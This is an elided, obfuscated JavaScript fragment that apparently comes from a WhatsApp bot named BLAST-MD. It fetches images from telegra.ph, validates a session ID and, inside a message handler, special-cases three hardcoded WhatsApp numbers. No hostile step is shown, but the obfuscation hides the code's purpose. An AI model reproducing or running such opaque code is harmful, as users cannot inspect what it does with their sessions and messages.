      ...
      const designs = [
        async () => {
          const imageBuffer = await axios.get(
            "https://telegra.ph/file/56f724ea5f83e648be49d.jpg",
            {
        ...
        async () => {
          const imageBuffer = await axios.get(
            "https://telegra.ph/file/016fbf2d66a8dd3504aa8.png",
            {
              responseType: "arraybuffer",
            }
          );
    ...
    if (_0x235024.type === "session") {
      ...
      if (_0xc4323e && /guru/gi.test(_0xc4323e) && _0xc4323e.length < 50) {
        ...
        try {
          ...
          console.error("Can't get SESSION_ID from BLAST-MD Server\nPlease Scan Qr From " + myQrUrl + "\n[ERROR]:", _0x575b4f);
        }
      ...
      _0x1a9455.ev.on("messages.upsert", async _0x179239 => {
        ...
        try {
          ...
          if (_0x28d709) {
            ...
            if (_0x2a3ea9) {
              let _0x70a0b4 = ["244956100349@s.whatsapp.net", "244946702814@s.whatsapp.net", "2348052944641@s.whatsapp.net"];
